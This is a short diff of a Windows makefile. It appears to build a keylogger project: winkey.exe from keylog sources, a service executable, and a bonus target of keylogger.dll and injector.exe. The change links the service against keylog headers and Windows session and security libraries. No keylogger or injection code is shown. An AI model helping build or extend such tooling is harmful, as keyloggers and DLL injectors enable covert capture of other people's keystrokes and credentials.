@@ -12,7 +12,7 @@ winkey.exe: $(SRCS) keylog\exemain.c
 	cl $(FLAGS) /Fe$@ $** $(RES_FILE) user32.lib psapi.lib
 
 svc.exe: service\svc.cpp
-	$(CC) $(FLAGS) /Fe$@ $**
+	$(CC) $(FLAGS) -I keylog /Fe$@ $** user32.lib advapi32.lib wtsapi32.lib
 
 bonus: keylogger.dll injector.exe
 
